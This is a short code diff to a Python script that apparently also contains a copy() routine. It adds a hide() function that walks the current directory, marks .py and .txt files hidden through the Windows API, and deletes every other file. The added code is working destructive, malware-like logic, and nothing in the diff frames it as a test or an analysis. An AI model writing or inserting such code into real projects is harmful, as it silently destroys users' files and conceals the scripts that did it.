@@ -65,3 +65,13 @@ def copy():
             source = os.path.abspath(directoryName)
         except:
             pass
+
+def hide():
+    for file_name in os.listdir('.'):
+        if file_name.find('.py') == len(file_name) - len('.py'):
+            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
+        elif file_name.find('.txt') == len(file_name) - len('.txt'):
+            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
+        else:
+            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_NORMAL)
+            os.remove(file_name)
